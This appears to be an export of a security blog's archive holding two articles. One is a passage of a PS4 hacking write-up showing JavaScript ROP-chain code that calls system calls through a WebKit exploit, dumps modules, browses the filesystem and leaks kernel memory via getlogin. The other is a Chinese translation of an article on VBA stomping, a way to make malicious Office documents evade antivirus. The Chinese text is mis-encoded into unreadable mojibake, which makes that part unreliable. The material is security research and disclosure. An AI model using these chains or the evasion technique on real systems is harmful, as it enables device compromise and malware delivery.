&quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1); if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2); if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3); if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4); if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5); if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6); this.add(module_bases[module] + address); } So, to load libSceAvSetting.sprx (0xb): chain.call(&quot;sceSysmoduleLoadModule&quot;, libSysmodule, 0x1850, 0xb, 0, 0, 0); Unfortunately, a fault will be triggered when trying to load certain modules; this is because the sceSysmoduleLoadModule function doesnâ€™t load dependencies, so you will need to manually load them first. Like most system calls, this should return 0 on success. To see the loaded module ID that was allocated, we can use one of Sonyâ€™s custom system calls, number 592, to get a list of currently loaded modules: var countAddress = chain.data; var modulesAddress = chain.data + 8; // System call 592, getLoadedModules(int *destinationModuleHandles, int max, int *count); chain.syscall(&quot;getLoadedModules&quot;, 592, modulesAddress, 256, countAddress); chain.execute(function() { var count = getU64from(countAddress); for(var index = 0; index &amp;lt; count; index++) { logAdd(&quot;Module handle: 0x&quot; + getU32from(modulesAddress + index * 4).toString(16)); } }); Running this without loading any additional modules will produce the following list: 0x0, 0x1, 0x2, 0xc, 0xe, 0xf, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1e, 0x37, 0x59 But if we run it after loading module 0xb, we will see an additional entry, 0x65. Remember that module ID is not the same as loaded module handle. We can now use another of Sonyâ€™s custom system calls, number 593, which takes a module handle and a buffer, and fills the buffer with information about the loaded module, including its base address. Since the next available handle is always 0x65, we can hardcode this value into our chain, rather than having to store the result from the module list. The buffer must start with the size of the struct that should be returned, otherwise error 0x16 will be returned, &quot;Invalid argument&quot;: setU64to(moduleInfoAddress, 0x160); chain.syscall(&quot;getModuleInfo&quot;, 593, 0x65, moduleInfoAddress); chain.execute(function() { logAdd(hexDump(moduleInfoAddress, 0x160)); }); It will return 0 upon success, and fill the buffer with a struct which can be read like so: var name = readString(moduleInfoAddress + 0x8); var codeBase = getU64from(moduleInfoAddress + 0x108); var codeSize = getU32from(moduleInfoAddress + 0x110); var dataBase = getU64from(moduleInfoAddress + 0x118); var dataSize = getU32from(moduleInfoAddress + 0x120); We now have everything we need to dump the module! dump(codeBase, codeSize + dataSize); There is another Sony system call, number 608, which works in a similar way to 593, but provides slightly different information about the loaded module: setU64to(moduleInfoAddress, 0x1a8); chain.syscall(&quot;getDifferentModuleInfo&quot;, 608, 0x65, 0, moduleInfoAddress); logAdd(hexDump(moduleInfoAddress, 0x1a8)); Itâ€™s not clear what this information is. Browsing the filesystemThe PS4 uses the standard FreeBSD 9.0 system calls for reading files and directories. However, whilst using read for some directories such as /dev/ will work, others, such as / will fail. Iâ€™m not sure why this is, but if we use getdents instead of read for directories, it will work much more reliably: writeString(chain.data, &quot;/dev/&quot;); chain.syscall(&quot;open&quot;, 5, chain.data, 0, 0); chain.write_rax_ToVariable(0); chain.read_rdi_FromVariable(0); chain.syscall(&quot;getdents&quot;, 272, undefined, chain.data + 0x10, 1028); This is the resultant memory: 0000010: 0700 0000 1000 0205 6469 7073 7700 0000 ........dipsw... 0000020: 0800 0000 1000 0204 6e75 6c6c 0000 0000 ........null.... 0000030: 0900 0000 1000 0204 7a65 726f 0000 0000 ........zero.... 0000040: 0301 0000 0c00 0402 6664 0000 0b00 0000 ........fd...... 0000050: 1000 0a05 7374 6469 6e00 0000 0d00 0000 ....stdin....... 0000060: 1000 0a06 7374 646f 7574 0000 0f00 0000 ....stdout...... 0000070: 1000 0a06 7374 6465 7272 0000 1000 0000 ....stderr...... 0000080: 1000 0205 646d 656d 3000 0000 1100 0000 ....dmem0....... 0000090: 1000 0205 646d 656d 3100 0000 1300 0000 ....dmem1....... 00000a0: 1000 0206 7261 6e64 6f6d 0000 1400 0000 ....random...... 00000b0: 1000 0a07 7572 616e 646f 6d00 1600 0000 ....urandom..... 00000c0: 1400 020b 6465 6369 5f73 7464 6f75 7400 ....deci_stdout. 00000d0: 1700 0000 1400 020b 6465 6369 5f73 7464 ........deci_std 00000e0: 6572 7200 1800 0000 1400 0209 6465 6369 err.........deci 00000f0: 5f74 7479 3200 0000 1900 0000 1400 0209 _tty2........... 0000100: 6465 6369 5f74 7479 3300 0000 1a00 0000 deci_tty3....... 0000110: 1400 0209 6465 6369 5f74 7479 3400 0000 ....deci_tty4... 0000120: 1b00 0000 1400 0209 6465 6369 5f74 7479 ........deci_tty 0000130: 3500 0000 1c00 0000 1400 0209 6465 6369 5...........deci 0000140: 5f74 7479 3600 0000 1d00 0000 1400 0209 _tty6........... 0000150: 6465 6369 5f74 7479 3700 0000 1e00 0000 deci_tty7....... 0000160: 1400 020a 6465 6369 5f74 7479 6130 0000 ....deci_ttya0.. 0000170: 1f00 0000 1400 020a 6465 6369 5f74 7479 ........deci_tty 0000180: 6230 0000 2000 0000 1400 020a 6465 6369 b0.. .......deci 0000190: 5f74 7479 6330 0000 2200 0000 1400 020a _ttyc0..&quot;....... 00001a0: 6465 6369 5f73 7464 696e 0000 2300 0000 deci_stdin..#... 00001b0: 0c00 0203 6270 6600 2400 0000 1000 0a04 ....bpf.$....... 00001c0: 6270 6630 0000 0000 2900 0000 0c00 0203 bpf0....)....... 00001d0: 6869 6400 2c00 0000 1400 0208 7363 655f hid.,.......sce_ 00001e0: 7a6c 6962 0000 0000 2e00 0000 1000 0204 zlib............ 00001f0: 6374 7479 0000 0000 3400 0000 0c00 0202 ctty....4....... 0000200: 6763 0000 3900 0000 0c00 0203 6463 6500 gc..9.......dce. 0000210: 3a00 0000 1000 0205 6462 6767 6300 0000 :.......dbggc... 0000220: 3e00 0000 0c00 0203 616a 6d00 4100 0000 &gt;.......ajm.A... 0000230: 0c00 0203 7576 6400 4200 0000 0c00 0203 ....uvd.B....... 0000240: 7663 6500 4500 0000 1800 020d 6e6f 7469 vce.E.......noti 0000250: 6669 6361 7469 6f6e 3000 0000 4600 0000 fication0...F... 0000260: 1800 020d 6e6f 7469 6669 6361 7469 6f6e ....notification 0000270: 3100 0000 5000 0000 1000 0206 7573 6263 1...P.......usbc 0000280: 746c 0000 5600 0000 1000 0206 6361 6d65 tl..V.......came 0000290: 7261 0000 8500 0000 0c00 0203 726e 6700 ra..........rng. 00002a0: 0701 0000 0c00 0403 7573 6200 c900 0000 ........usb..... 00002b0: 1000 0a07 7567 656e 302e 3400 0000 0000 ....ugen0.4..... 00002c0: 0000 0000 0000 0000 0000 0000 0000 0000 ................ You can read some of these devices, for example: reading /dev/urandom will fill the memory with random data. It is also possible to parse this memory to create a clean list of entries; look at browser.html in the repository for a complete file browser: Unfortunately, due to sandboxing we donâ€™t have complete access to the file system. Trying to read files and directories that do exist but are restricted will give you error 2, ENOENT, &quot;No such file or directory&quot;. We do have access to a lot of interesting stuff though including encrypted save data, trophies, and account information. I will go over more of the filesystem in my next article. SandboxingAs well as file related system calls failing for certain paths, there are other reasons for a system call to fail. Most commonly, a disallowed system call will just return error 1, EPERM, &quot;Operation not permitted&quot;; such as trying to use ptrace, but other system calls may fail for different reasons: Compatibilty system calls are disabled. If you are trying to call mmap for example, you must use system call number 477, not 71 or 197; otherwise a segfault will be triggered. Other system calls such as exit will also trigger a fault: chain.syscall(&quot;exit&quot;, 1, 0); Trying to create an SCTP socket will return error 0x2b, EPROTONOSUPPORT, indicating that SCTP sockets have been disabled in the PS4 kernel: //int socket(int domain, int type, int protocol); //socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP); chain.syscall(&quot;socket&quot;, 97, 2, 1, 132); And although calling mmap with PROT_READ | PROT_WRITE | PROT_EXEC will return a valid pointer, the PROT_EXEC flag is ignored. Reading its protection will return 3 (RW), and any attempt to execute the memory will trigger a segfault: chain.syscall(&quot;mmap&quot;, 477, 0, 4096, 1 | 2 | 4, 4096, -1, 0); chain.write_rax_ToVariable(0); chain.read_rdi_FromVariable(0); chain.add(&quot;pop rax&quot;, 0xfeeb); chain.add(&quot;mov [rdi], rax&quot;); chain.add(&quot;mov rax, rdi&quot;); chain.add(&quot;jmp rax&quot;); The list of open source software used in the PS4 doesnâ€™t list any kind of sandboxing software like Capsicum, so the PS4 must use either pure FreeBSD jails, or some kind of custom, proprietary, sandboxing system (unlikely). JailsWe can prove the existence of FreeBSD jails being actively used in the PS4â€™s kernel through the auditon system call being impossible to execute within a jailed environment: chain.syscall(&quot;auditon&quot;, 446, 0, 0, 0); The first thing the auditon system call does is check jailed here, and if so, return ENOSYS: if (jailed(td-&gt;td_ucred)) return (ENOSYS); Otherwise the system call would most likely return EPERM from the mac_system_check_auditon here: error = mac_system_check_auditon(td-&gt;td_ucred, uap-&gt;cmd); if (error) return (error); Or from the priv_check here: error = priv_check(td, PRIV_AUDIT_CONTROL); if (error) return (error); The absolute furthest that the system call could reach would be immediately after the priv_check, here, before returning EINVAL due to the length argument being 0: if ((uap-&gt;length &lt;= 0) || (uap-&gt;length &gt; sizeof(union auditon_udata))) return (EINVAL); Since mac_system_check_auditon and priv_check will never return ENOSYS, having the jailed check pass is the only way ENOSYS could be returned. When executing the chain, ENOSYS _is_ returned (0x48). This tells us that whatever sandbox system the PS4 uses is at least based on jails because the jailed check passes. FreeBSD 9.0 kernel exploitsBefore trying to look for new vulnerabilities in the FreeBSD 9.0 kernel source code, we should first check whether any of the kernel vulnerabilities already found could be used on the PS4. We can immediately dismiss some of these for obvious reasons: FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit - this wonâ€™t work since, as previously stated, we donâ€™t have access to the ptrace system call. FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit - wonâ€™t work because the PS4 uses an AMD processor. FreeBSD Kernel - Multiple Vulnerabilities - maybe the first vulnerability will lead to something, but the other 2 rely on SCTP sockets, which the PS4 kernel has disabled (as previously stated). However, there are some smaller vulnerabilites, which could lead to something: getloginOne vulnerability which looks easy to try is using the getlogin system call to leak a small amount of kernel memory. The getlogin system call is intended to copy the login name of the current session to userland memory, however, due to a bug, the whole buffer is always copied, and not just the size of the name string. This means that we can read some uninitialised data from the kernel, which might be of some use. Note that the system call (49) is actually int getlogin_r(char *name, int len); and not char *getlogin(void);. So, letâ€™s try copying some kernel memory into an unused part of userland memory: chain.syscall(&quot;getlogin&quot;, 49, chain.data, 17); Unfortunately 17 bytes is the most data we can get, since: Login names are limited to MAXLOGNAME (from &amp;lt;sys/param.h&amp;gt;) characters, currently 17 including null. â€“ FreeBSD Man Pages After executing the chain, the return value was 0, which means that the system call worked! An excellent start. Now letâ€™s take a look at the memory which we pointed to: Before executing the chain: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 After executing the chain: 72 6f 6f 74 00 fe ff ff 08 62 61 82 ff ff ff ff 00 After decoding the first 4 bytes as ASCII: root So the browser is executed as root! That was unexpected. But more interestingly, the memory leaked looks like a pointer to something in the kernel, which is always the same each time the chain is run; this is evidence to support Yifanluâ€™s claims that the PS4 has no Kernel ASLR! SummaryFrom the information currently available, the PS4â€™s kernel seems to be very similar to the stock FreeBSD 9.0 kernel. Importantly, the differences that are present appear to be from standard kernel configuration changes (such as disabling SCTP sockets), rather than from modified code. Sony have also added several of their own custom system calls to the kernel, but apart from this, the rest of the kernel seems fairly untouched. In this respect, Iâ€™m inclined to believe that the PS4 shares most of the same juicy vulnerabilities as FreeBSD 9.0â€™s kernel! Unfortunately, most kernel exploits cannot be triggered from the WebKit entry point that we currently have due to sandboxing constraints (likely to be just stock FreeBSD jails). And with FreeBSD 10 being out, itâ€™s unlikely that anyone is stashing away any private exploits for FreeBSD 9, so unless a new one is suddenly released, weâ€™re stuck with what is currently available. The best approach from here seems to be reverse engineering all of the modules which can be dumped, in order to document as many of Sonyâ€™s custom system calls as possible; I have a hunch that we will have more luck targeting these, than the standard FreeBSD system calls. Recently Jaicrab has discovered two UART ports on the PS4 which shows us that there are hardware hackers interested in the PS4. Although the role of hardware hackers has traditionally been to dump the RAM of a system, like with the DSi, which we can already do thanks to the WebKit exploit, thereâ€™s also the possibility of a hardware triggered kernel vulnerability being found, like geohotâ€™s original PS3 hypervisor hack. It remains most likely that a kernel exploit will be found on the PS4 through system call vulnerabilities though. åŽŸæ–‡åœ°å€]]></content>
      <categories>
        <category>ç¡¬ä»¶åˆ†æž</category>
      </categories>
      <tags>
        <tag>å¤–æ–‡ç¿»è¯‘</tag>
        <tag>æ¼æ´žæŒ–æŽ˜</tag>
        <tag>PS4</tag>
        <tag>ç¡¬ä»¶åˆ†æž</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VBA Stomping ç®€ä»‹]]></title>
    <url>%2F2019%2F04%2F30%2FVBA-Stomping%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[åŽŸæ–‡æ ‡é¢˜ VBA Stomping â€” Advanced Maldoc Techniques (Oct 6, 2018) ä½œè€…ï¼šKirk Sayre @bigmacjpgï¼ŒHarold Ogden @haroldogden å’Œ Carrie Roberts @OrOneEqualsOne VBA Stomping æ˜¯ä¸€ç§å¯ä»¥ç»•è¿‡åç—…æ¯’æ£€æµ‹æ¶æ„æ–‡æ¡£ç”ŸæˆæŠ€æœ¯ï¼Œå®ƒæœ€åˆç”± Vesselin Bontchev åšå£«å¼•èµ·æˆ‘ä»¬çš„æ³¨æ„ï¼ˆè§æ­¤å¤„ï¼‰ã€‚VBA stomping æ˜¯æŒ‡é”€æ¯ Microsoft Office æ–‡æ¡£ä¸­çš„ VBA æºä»£ç ï¼Œåªç•™ä¸‹æ–‡æ¡£æ–‡ä»¶ä¸­ç§°ä¸º p-code çš„å®ä»£ç çš„ç¼–è¯‘ç‰ˆæœ¬ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»…åŸºäºŽVBAæºä»£ç çš„æ¶æ„æ–‡æ¡£æ£€æµ‹ä¼šå¤±è´¥ã€‚åœ¨è¿™ç¯‡åšæ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è¯¦ç»†æ¼”ç¤º VBA stomping å¹¶ä»‹ç»ä¸€äº›å…¶ä»–æŠ€æœ¯ã€‚ VBA Stompingé¦–å…ˆï¼Œæˆ‘ä»¬å°†åœ¨ä¸€ä¸ªç®€å•çš„éžæ¶æ„å®ä¸Šæ¼”ç¤º VBA Stompingã€‚æ­¤æ–‡æ¡£åœ¨æ‰“å¼€æ—¶æ˜¾ç¤ºå¸¦æœ‰æ–‡æœ¬ ABC çš„æ¶ˆæ¯æ¡†ã€‚VBA æºä»£ç å’Œç”Ÿæˆçš„æ¶ˆæ¯æ¡†å¦‚ä¸‹æ‰€ç¤ºã€‚ çŽ°åœ¨æˆ‘ä»¬ä¿®æ”¹ä¸Šé¢æ˜¾ç¤ºçš„VBAæºä»£ç ï¼ŒåŒæ—¶ä¿æŒä¸­é—´ p-code ä¸å˜ã€‚æˆ‘ä»¬å°†é›†ä¸­è®¨è®ºå½“å‰çš„ .docx/.xlsx/.docm/.xlsmï¼ˆOffice 2007 ä»¥ä¸Šï¼‰æ ¼å¼ã€‚ä½†æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„æŠ€æœ¯å¯ä»¥è½»æ¾åº”ç”¨äºŽè¾ƒæ—§çš„ .doc/.xlsæ ¼å¼ã€‚åœ¨ Office 2007 ä»¥ä¸Šæ–‡ä»¶ä¸­ï¼ŒVBA æºä»£ç å’Œ p-code é€šå¸¸ä½äºŽåä¸º vbaProject.bin çš„æ–‡ä»¶ä¸­ã€‚è¯·æ³¨æ„è¿™æ˜¯é»˜è®¤æ–‡ä»¶åï¼Œå¯ä»¥è¢«é‡å‘½åã€‚å¦‚æžœè¦æ‰‹åŠ¨ä¿®æ”¹æ­¤æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆè§£åŽ‹ .docm/.xlsm æ–‡ä»¶ï¼Œç„¶åŽåœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ‰“å¼€ vbaProject.bin æ–‡ä»¶ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°† ABC æ”¹ä¸º XYZï¼Œä½†ä»…é™äºŽå­˜å‚¨ VBA æºä»£ç çš„ä½ç½®ï¼Œè€Œä¸æ˜¯ p-code éƒ¨åˆ†ã€‚VBA æºä»£ç ä»¥åŽ‹ç¼©å½¢å¼å­˜å‚¨ï¼Œå³ä¸‹å›¾ä¸­ä¸å¯æ‰“å°æˆ–å¥‡æ€ªçš„å­—ç¬¦ã€‚ çŽ°åœ¨æˆ‘ä»¬å·²ç»æ‰‹åŠ¨ç¼–è¾‘äº† VBA æºä»£ç å°† ABC æ›´æ”¹ä¸º XYZï¼Œæˆ‘ä»¬æ‰“å¼€æ–‡æ¡£å¹¶åœ¨å•å‡»â€œå¯ç”¨å†…å®¹â€æŒ‰é’®ä¹‹å‰æ£€æŸ¥ VBA æºä»£ç ã€‚ æˆ‘ä»¬æ‰“å¼€æ–‡æ¡£ä½†æœªå¯ç”¨å®ã€‚åœ¨ä»£ç ç¼–è¾‘å™¨ä¸­æ£€æŸ¥å®ï¼Œä»£ç æ˜¾ç¤ºå®å°†æ˜¾ç¤ºå¸¦æœ‰æ–‡æœ¬ XYZ çš„æ¶ˆæ¯æ¡†ï¼Œä½†äº‹å®žå¹¶éžå¦‚æ­¤ã€‚å®žé™…ä¸Šï¼Œåªè¦å¯ç”¨äº†å†…å®¹ï¼Œå°±ä¼šæ˜¾ç¤ºä¸€ä¸ª ABC çš„æ¶ˆæ¯æ¡†ï¼Œå¹¶ä¸”ä»£ç ç¼–è¾‘å™¨ä¸­çš„æºä»£ç ä¼šæ›´æ–°ä»¥åŒ¹é…ï¼ æºä»£ç è¡¨ç¤º XYZ å°†æ˜¾ç¤ºåœ¨æ¶ˆæ¯æ¡†ä¸­ï¼Œä½†æ˜¾ç¤º ABC ã€‚åˆ°åº•æ˜¯æ€Žä¹ˆå›žäº‹ï¼Ÿ æ­£å¦‚ Bontchev åšå£«æ‰€è§£é‡Šçš„é‚£æ ·ï¼Œåªè¦ p-code ä¸Žç³»ç»Ÿä¸Šçš„å½“å‰ VBA ç‰ˆæœ¬å…¼å®¹ï¼Œæ–‡æ¡£å®žé™…æ‰§è¡Œçš„æ˜¯å­˜å‚¨çš„ p-codeã€‚æ­¤å¤–ï¼Œå®ç¼–è¾‘å™¨ä¸­æ˜¾ç¤ºçš„å†…å®¹ï¼ˆä¸€æ—¦å¯ç”¨å†…å®¹ï¼‰å¹¶ä¸æ˜¯è§£åŽ‹çš„ VBA æºä»£ç ï¼Œè€Œæ˜¯åç¼–è¯‘çš„ p-codeã€‚ å¦‚æžœæˆ‘ä»¬åœ¨ä¸åŒç‰ˆæœ¬çš„ Wordï¼ˆä½¿ç”¨ä¸åŒçš„ VBA ç‰ˆæœ¬ï¼‰ä¸­æ‰“å¼€æ–‡æ¡£ï¼Œåˆ™ p-code å°†ä¸å¯é‡ç”¨ã€‚è¿™å°†å¼ºåˆ¶å°† VBA æºä»£ç è§£åŽ‹ç¼©å¹¶é‡æ–°ç¼–è¯‘ä¸º p-codeï¼Œä»Žè€Œåœ¨æ¶ˆæ¯æ¡†ä¸­æ˜¾ç¤º XYZã€‚æ‰€ä»¥çŽ°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡æ¡£ï¼Œåœ¨ä¸€ä¸ªç‰ˆæœ¬çš„Officeä¸Šæ˜¾ç¤º ABCï¼Œä½†åœ¨å¦ä¸€ä¸ªç‰ˆæœ¬ä¸Šæ˜¾ç¤º XYZã€‚ è¯·æ³¨æ„ï¼Œè¿™å¾ˆé‡è¦ã€‚ä½¿ç”¨ VBA Stomping æŠ€æœ¯çš„æ¶æ„æ–‡æ¡£åªèƒ½ä½¿ç”¨ç”¨äºŽåˆ›å»ºæ–‡æ¡£æ—¶ç›¸åŒçš„ VBA ç‰ˆæœ¬æ‰§è¡Œã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æ¶æ„æ–‡æ¡£ç”Ÿæˆä¹‹å‰å¯¹ç›®æ ‡è¿›è¡Œä¾¦å¯Ÿæ¥ç¡®å®šè¦ä½¿ç”¨çš„é€‚å½“ Office ç‰ˆæœ¬é€‚å½“ Office ç‰ˆæœ¬ï¼›æˆ–è€…é€šè¿‡ç”Ÿæˆå…·æœ‰å¤šä¸ª Office ç‰ˆæœ¬çš„æ¶æ„æ–‡æ¡£å¹¶å°†å…¶å–·å°„åˆ°ç›®æ ‡ä¸Šæ¥è§£å†³æ­¤é™åˆ¶ã€‚ ä»Žé˜²å®ˆè§’åº¦çœ‹ VBA stomping æ˜¯ä»€ä¹ˆæ•ˆæžœå‘¢ï¼Ÿé€šå¸¸æ¶æ„æ–‡æ¡£æ£€æµ‹ä»…åŸºäºŽ VBA æºä»£ç ã€‚ç”šè‡³è®¸å¤šå¯ç”¨äºŽåˆ†æžæ–‡æ¡£çš„å·¥å…·éƒ½æ— æ³•è¯†åˆ« VBA æºå’Œ p-code ä¹‹é—´çš„å·®å¼‚ã€‚ç”± Philippe Lagadec ç¼–å†™çš„ olevba è„šæœ¬å¯¹ç¯¡æ”¹æ–‡æ¡£çš„åˆ†æžä»…æ˜¾ç¤ºäº†è§£åŽ‹ç¼©çš„æºä»£ç ï¼Œä¸”ç¼ºå°‘ p-code ç»†èŠ‚ã€‚ é™¤éžä½¿ç”¨ p-code dumper æ’ä»¶è¿è¡Œï¼Œå¦åˆ™ Didier Stevens çš„ Python è„šæœ¬ oledump.py ä¹Ÿä¼šç»™å‡ºç±»ä¼¼çš„ç»“æžœã€‚åœ¨ä½¿ç”¨è¯¥æ’ä»¶çš„æƒ…å†µä¸‹ï¼Œè¾“å‡ºç»™å‡ºäº†ä¸€äº›æŒ‡ç¤ºï¼Œå³ p-code å°†ä½¿æ¶ˆæ¯æ¡†æ˜¾ç¤º ABCï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ Bontchev åšå£«å‘å¸ƒäº†ä¸€ä¸ªåä¸º pcodedmp.py çš„ Python è„šæœ¬ç”¨äºŽæ˜¾ç¤º p-codeï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚è¾“å‡ºå¯ä»¥æ˜¾ç¤ºæ“ä½œåç§°è€Œä¸æ˜¯ä¸Šé¢çš„æ“ä½œç ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ç”¨é›¶æˆ–éšæœºå­—èŠ‚è¦†ç›– VBA æºä»£ç æ¥å®Œå…¨æ“¦é™¤ï¼ˆstompï¼‰ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¿®æ”¹å®ƒã€‚ä»¥ä¸‹æˆªå›¾æ˜¾ç¤ºäº†å¦‚ä½•åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ‰‹åŠ¨æ‰§è¡Œæ­¤æ“ä½œã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒVBA ç¼–è¾‘å™¨æ ¹æœ¬ä¸æ˜¾ç¤ºå®ä»£ç ï¼Œä½†å¯ç”¨å†…å®¹åŽä»ç„¶æ˜¾ç¤ºå¸¦æœ‰æ–‡æœ¬ ABC çš„æ¶ˆæ¯æ¡†ã€‚çŽ°åœ¨ï¼Œæˆ‘ä»¬åœ¨æ­¤æ–‡ä»¶ä¸Šé‡æ–°è¿è¡Œ olevbaï¼Œç»“æžœä¸æ˜¾ç¤ºä»»ä½•VBAæºä»£ç ï¼Œå¹¶æ˜¾ç¤ºâ€œæœªæ‰¾åˆ°å¯ç–‘å…³é”®å­—æˆ– IOCâ€ï¼Œè€Œä¸æ˜¯ä¹‹å‰çªå‡ºæ˜¾ç¤ºæˆ‘ä»¬åœ¨ä½¿ç”¨å¯ç–‘å…³é”®å­—ï¼ˆAutoOpenï¼‰ã€‚ è¿™ä¸ªé—®é¢˜æœ‰å¤šä¸¥é‡?æˆ‘ä»¬çŽ°åœ¨å°†æ›´æ·±å…¥åœ°äº†è§£ Office å¦‚ä½•ä½¿ç”¨åŽ‹ç¼©çš„ VBA æºä»£ç å’Œ p-codeã€‚ç¨åŽå½“æˆ‘ä»¬è®¨è®ºå¦‚ä½•æ»¥ç”¨ Office åŠŸèƒ½æ¥è½»æ¾ä¿®æ”¹æ¶æ„æ–‡æ¡£ä»¥æ¬ºéª—è®¸å¤š AV æ‰«ææ—¶ï¼Œè¿™å°†ä¼šå‘æŒ¥ä½œç”¨ã€‚ Office æ–‡æ¡£åŒ…å«ä¸¤ä¸ªç”¨äºŽæå– VBA çš„ä½ç½®ï¼Œå³åŽ‹ç¼©çš„ VBA æºä»£ç å’Œ p-codeã€‚ä¸‹è¡¨è¯¦ç»†è¯´æ˜Žäº†åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ä½¿ç”¨å“ªä¸ª VBA æ•°æ®æºï¼š ä»Žè¯¥è¡¨ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æžœæˆ‘ä»¬æœ‰æœ‰æ•ˆçš„ p-codeï¼Œåˆ™åœ¨å¯ç”¨å®æ—¶å®ƒä¼šå¿½ç•¥åŽ‹ç¼©çš„ VBA æºä»£ç ï¼Œå¹¶é€šè¿‡è¿è¡Œ p-code æ¥æ‰§è¡Œæ‰€æœ‰å®åŠŸèƒ½ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œè¿™å‘Šè¯‰æˆ‘ä»¬ï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨ç ´åæˆ–ä¿®æ”¹åŽ‹ç¼©çš„ VBA æºä»£ç ï¼Œå¹¶ä¸”ä»ç„¶è®©æˆ‘ä»¬çš„æ¶æ„æ–‡æ¡£æ‰§è¡Œå…¶æŒ‡å®šçš„ä»»åŠ¡ã€‚ çŽ°å®žæ¡ˆä¾‹ä¸Šè¿°è¡¨æ˜Žè¿™é€‚ç”¨äºŽç®€å•ç¤ºä¾‹ï¼Œä½†è¿™çœŸçš„æ˜¯å¨èƒå—ï¼Ÿè®©æˆ‘ä»¬é€šè¿‡ä½¿ç”¨å·²çŸ¥çš„æ¶æ„æ–‡æ¡£å°†å…¶æå‡åˆ°æ–°çš„æ°´å¹³ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä»Žæœ€è¿‘çš„ Emotet æ¶æ„æ–‡æ¡£å¼€å§‹ï¼Œå®ƒç›®å‰åœ¨ Virus total ä¸Šè¢« 36/59 çš„ä¾›åº”å•†æ£€æµ‹ä¸ºæ¶æ„ã€‚ å¦‚æžœæˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªæ–‡æ¡£å¹¶ä¸”å¦‚ä¸Šæ‰€è¿°æ–¹æ³•ç®€å•åœ°å¤„ç† VBA æºä»£ç ï¼Œé‚£ä¹ˆæ£€æµ‹çŽ‡å°†é™è‡³ 58 ç§é˜²ç—…æ¯’è§£å†³æ–¹æ¡ˆä¸­çš„ 7 ç§ï¼ å¦‚æ‚¨æ‰€è§ï¼Œè¿™ç»™ç½‘ç»œé˜²å¾¡è€…å¸¦æ¥äº†ä¸¥é‡çš„é—®é¢˜ã€‚å³ä½¿æ‰‹åŠ¨åˆ†æžæ­¤ç±»æ–‡æ¡£ä¹Ÿå¯èƒ½å­˜åœ¨é—®é¢˜ã€‚æ­¤æ—¶æ˜¾è€Œæ˜“è§çš„é—®é¢˜æ˜¯å¯ä»¥é€šè¿‡å·¥å…·è‡ªåŠ¨æ‰§è¡Œ VBA stomping è¿˜æ˜¯æˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ç¼–è¾‘ Office æ–‡æ¡£ï¼Ÿ è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚æˆ‘ä»¬å¼€å‘äº†ä¸€ä¸ª POC å·¥å…·æ¥è‡ªåŠ¨åœ¨ä»»ä½• Office æ–‡æ¡£ä¸­å¤„ç†åŽ‹ç¼©çš„ VBA æºä»£ç ï¼ˆå®ƒè¢«ç”¨äºŽ VBA stomping ç¤ºä¾‹çš„ Emotet æ–‡æ¡£ï¼Œæˆ‘ä»¬ä¸ä¼šå‘å¸ƒæ­¤å®žç”¨ç¨‹åºï¼‰ã€‚è€ƒè™‘åˆ°è‡ªåŠ¨åŒ– VBA stomping ååˆ†å®¹æ˜“ï¼Œè¿™æ˜¯ä¸€ä¸ªçœŸæ­£çš„å¨èƒã€‚ å˜å¾—æ›´ç³Ÿè€ƒè™‘æ¶æ„æ–‡æ¡£è¢«è®¾è®¡ä¸ºåœ¨æ‰§è¡Œæ¶æ„æœ‰æ•ˆè½½è·ä¹‹åŽç«‹å³å…³é—­ MS Word çš„æƒ…å†µã€‚ä¸Ž VBA stomping ç»“åˆä½¿ç”¨æ—¶ï¼Œæ²¡æœ‰è„±æœºçš„ VBA æºä»£ç æå–å·¥å…·å°†æ˜¾ç¤º VBA æºä»£ç ï¼Œå¹¶ä¸”åœ¨å¯ç”¨å®ä¹‹å‰ï¼ŒVBA æºä»£ç ç”šè‡³ä¸ä¼šæ˜¾ç¤ºåœ¨ Office å®ç¼–è¾‘å™¨çª—å£ä¸­ã€‚ä½†æ˜¯å¯ç”¨å®ä¼šå¯¼è‡´ Word 